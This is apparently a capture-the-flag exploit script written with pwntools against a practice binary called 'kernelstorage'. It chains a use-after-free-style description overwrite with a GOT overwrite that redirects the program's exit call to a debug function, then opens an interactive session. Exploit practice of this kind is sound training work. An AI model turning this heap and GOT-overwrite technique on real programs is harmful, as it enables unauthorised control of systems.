from pwn import *

bss = 0x4050B8 # + 104 is password
debug_func = 0x000000000401FEC
exit_got = 0x000000000405070

def reg( p, username, password ):
	p.recvuntil( "> " )
	p.send( "2\n" ) # reg
	p.recvuntil( ": " )
	p.send( username + "\n" ) # username
	p.recvuntil( ": " )
	p.send( password + "\n" ) # password

def log( p, username, password ):
	p.recvuntil( "> " )
	p.send( "1\n" ) # login
	p.recvuntil( ": " )
	p.send( username + "\n" ) # username
	p.recvuntil( ": " )
	p.send( password +"\n" ) # password

def menu( p ):
	p.recvuntil( "> " )

def create_kernel( p, NAME, DESC ):
	menu( p )
	p.send( "1\n" ) # create kernel
	p.recvuntil( ": " )
	p.send( NAME + "\n") # kernel name
	p.recvuntil( ": " )
	p.send( DESC + "\n" ) # kernel desc
	p.recvuntil( ": " )
	p.send( "Y\n" ) # private

def delete_kernel( p, NAME ):
	menu( p )
	p.send( "3\n" )
	p.recvuntil( ": " )
	p.send( NAME + '\n' )

def change_user_desc( p, size, data ):
	menu( p )
	p.send( "7\n" )
	p.recvuntil( ": " )
	p.send( str( size ) + '\n' ) # size of desc
	p.recvuntil( ": " )
	p.send( data + '\n' )

def edit_last_used_kernel( p, data ):
	menu( p )
	p.send( "9\n" )
	p.recvuntil( ": " )
	p.send( data + '\n' )

if __name__ == "__main__":

	p = process( "./kernelstorage" )
	# gdb.attach( p, '''
	# 	b *change_user_desc+286
	# 	b *delete_kernel+248
	# 	break *edit_last_kernel_data+162
	# 	b *edit_last_kernel_data+108
	# ''' 
	# )

	reg( p, 'ker', p64( exit_got ) )
	log( p, 'ker', p64( exit_got ) )

	create_kernel( p, "ker1", "ker1_entry" )	
	delete_kernel( p, "ker1" )
	change_user_desc( p, 24, p64( bss ) )
	edit_last_used_kernel(p, p64( debug_func ) )

	p.interactive()
